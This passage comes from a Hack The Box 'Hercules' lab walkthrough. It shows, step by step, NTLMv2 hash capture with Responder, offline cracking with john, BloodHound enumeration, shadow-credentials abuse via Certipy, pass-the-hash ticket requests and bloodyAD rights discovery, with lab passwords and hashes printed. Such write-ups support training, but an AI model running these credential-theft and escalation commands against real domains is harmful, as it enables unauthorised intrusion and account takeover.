    Responder IPv6             [dead:beef:4::1021]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-3AC71006QWN]
    Responder Domain Name      [5OLG.LOCAL]
    Responder DCE-RPC Port     [46048]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

Now we upload again.

![Hercules Website web admin Forms Bad odt](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-forms-bad-odt.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.129.x.x
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:6badb4841aeba869:A31A6100EF71843EA20B75307E5D4B6E:010100000000000080000EE01642DC01B5B7FC34B05715BF000000000200080035004F004C00470001001E00570049004E002D0033004100430037003100300030003600510057004E0004003400570049004E002D0033004100430037003100300030003600510057004E002E0035004F004C0047002E004C004F00430041004C000300140035004F004C0047002E004C004F00430041004C000500140035004F004C0047002E004C004F00430041004C000700080080000EE01642DC0106000400020000000800300030000000000000000000000000200000FCEFEF98601E4C1B811A771792477489B54FADA6D7FAA1411B66BF1CEE4053570A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
```

BOOM! We got `NTLM hash` for `natalie.a`. <br>
&rarr; Let's crack it out.

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt natalie.a_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Prettyprincess123! (natalie.a)     
1g 0:00:01:12 DONE (2025-10-20 23:17) 0.01385g/s 148548p/s 148548c/s 148548C/s Pslams23..Prater
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Got `natalie.a:Prettyprincess123!`. <br>
Now we got some good sign as having more creds. <br>
&rarr; Let's get to `bloodhound` to uncover more things.

### Bloodhound
We are going to use `bloodhound` on `ken.w` user.

```bash
└─$ bloodhound-python -u ken.w -p 'change*th1s_p@ssw()rd!!' -d hercules.htb -dc dc.hercules.htb -ns 10.129.x.x -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.hercules.htb
INFO: Done in 01M 07S
```

Now setup bloodhound by download the lastest version [BloodHound CE v8.2.0](https://github.com/SpecterOps/BloodHound/releases/tag/v8.2.0) then following instructions from [community-edition-quickstart](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) to get `bloodhound-cli` to get start.

![Hercules Website Bloodhound CE ken.w](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-kenw.png)

When injects data collected into bloodhound, we got some error due to unmatch so we try to downgrade like [Bloodhound CE v8.0.0](https://github.com/SpecterOps/BloodHound/releases/tag/v8.0.0) and still can not work. <br>
&rarr; So we try use it with bloodhound legacy the OG one [Bloodhound Legacy v4.3.1](https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1).

![Hercules Website Bloodhound Legacy ken.w](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-kenw.png)

Also data injects perfectly, now we gonna discover around these data. <br>
&rarr; Starting with `natalie.a`.

![Hercules Website Bloodhound Legacy natalie.a](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-nataliea.png)

We can see that `natalie.a` is member of `WEB SUPPORT@HERCULES.HTB` then check this group out.

![Hercules Website Bloodhound Legacy natalie.a web support](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-nataliea-web-support.png)

`WEB SUPPORT@HERCULES.HTB` got `GenericWrite` over 6 users &rarr; `web_admin`, `bob.w`, `ken.w`, `ray.n`, `johnathan.j` and `harris.d`. <br>
Now we taking some general things first by looking for the `Shortest Path` to see the overview so that we can construct the path to exploit to not messing things up.

![Hercules Website Bloodhound Legacy Shortest Path](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-shortest-path.png)

So we see some potential user we can target on like `mark.s` and `stephen.m` is member of `SECURITY HELPDESK@HERCULES.HTB` that can `ForceChangePassword` to `Auditor`, then `HELPDESK AMINISTRATORS@HERCULES.HTB` can also `ForceChangePassword` to `ashley.b`. <br>
But maybe the main and last target is `IIS_WEBSERVER$@HERCULES.HTB` that can `AllowedToAct` straight to `DC.HERCULES.HTB` that can `DCSync` to `HERCULES.HTB`. <br>
And also 1 weird dunno that is users or groups that identified as `?` so we gonna discover during the process. <br>
We will grab some more general for those groups info as well.

![Hercules Website Bloodhound Legacy Security Helpdesk](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-security-helpdesk.png)

So we have `SECURITY HELPDESK@HERCULES.HTB` got `ForceChangePassword` to 7 users &rarr; `angelo.o`, `stephen.m`, `nata.h`, `vincent.g`, `elijah.m`, `auditor` and `mark.s`.

![Hercules Website Bloodhound Legacy Auditor](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-auditor.png)

Checking `Auditor` that this one is member of 4 groups &rarr; `Domain Users`, `Domain Employees`, `Remote Management` and `Forest Management`.

![Hercules Website Bloodhound Legacy Remote Management](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-remote-management.png)

The `REMOTE MANAGEMENT@HERCULES` got `ashley.b` so probably 2 users we can use remote inside these session. <br>
Also we got group `Forest Management` and we can thinking out somethings like there will be another `DC` or some source of `ADCS` attack related to some certificate that we need to deal with. <br>
&rarr; From what we get earlier, we can start having overview the path that could be from `mark.s` or `stephen.m` then target to `Auditor` then target `ashley.b` and last one is `iis_webserver$` which we got no ideas yet.

Now we will back to `natalie.a` to discover more and starting out path to get further inside.

![Hercules Website Bloodhound Legacy natalie.a to bob.w](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-nataliea-to-bobw.png)

As we said `natalie.a` is member of `WEB SUPPORT@HERCULES.HTB` group and this group got `GenericWrite` to `bob.w` so we will start with this one first.

![Hercules Website Bloodhound Legacy natalie.a genericwrite bob.w](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-legacy-nataliea-genericwrite-bobw.png)

When we right click on `GenericWrite` we will see some ideas that we can use to abuse. <br>
&rarr; So we will go with [shadow-credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) as there is lots of way to do.

> *Check out [shadow-credentials-attack](https://www.hackingarticles.in/shadow-credentials-attack/) to see some shadow-creds attack.*

We will start to request a kerberos TGT for `natalie.a`.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -k hercules.htb/natalie.a:'Prettyprincess123!'
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache
```

Then set the new ticket.

```bash
└─$ export KRB5CCNAME=natalie.a.ccache
```

We gonna use [Certipy](https://github.com/ly4k/Certipy) to perform the shadow-credentials attack to get `bob.w` hash.

```bash
└─$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -account bob.w
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The resolution lifetime expired after 5.102 seconds: Server Do53:8.8.8.8@53 answered The DNS operation timed out.; Server Do53:8.8.4.4@53 answered The DNS operation timed out.; Server Do53:1.1.1.1@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b52a0ed57c6a4fef865291f549f8668a'
[*] Adding Key Credential with device ID 'b52a0ed57c6a4fef865291f549f8668a' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID 'b52a0ed57c6a4fef865291f549f8668a' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

After we got `bob.w` hash, we then request for TGT.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -hashes :8a65c74e8f0073babbfac6725c66cc3f -k hercules.htb/bob.w
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bob.w.ccache
```

Now we will start to Active Directory Enum inside `bob.w` via [bloodyAD](https://github.com/CravateRouge/bloodyAD).

> *There is [wiki](https://github.com/CravateRouge/bloodyAD/wiki) section where we can check out to know what command we will use to enum.*

We gonna check the `writeable` on `bob.w`.

```bash
└─$ bloodyAD -d hercules.htb -u bob.w -k --host dc.hercules.htb --dc-ip 10.129.x.x get writable --detail                                

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Vincent Gray,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Nate Hicks,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Mark Stone,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Elijah Morrison,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Angelo Onclarit,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
name: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
cn: WRITE

distinguishedName: CN=Ken Wiggins,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Johnathan Johnson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Harris Dunlop,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE
```

So we got `CREATE_CHILD` rights on target `OU`.

```bash
distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE
```

And also `WRITE` permissions on `stephen.m`, `auditor` and even on himself too.

```bash
distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

<SNIP>

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE
```

```bash
distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
name: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
cn: WRITE
```

So now we will move `stephen.m` to `Web Department` OU as it has more permissive ACLs. <br>
&rarr; We will perform it with [powerview.py](https://github.com/aniqfakhrul/powerview.py) that is like the steroid version of the `PowerView.ps1`.

```bash
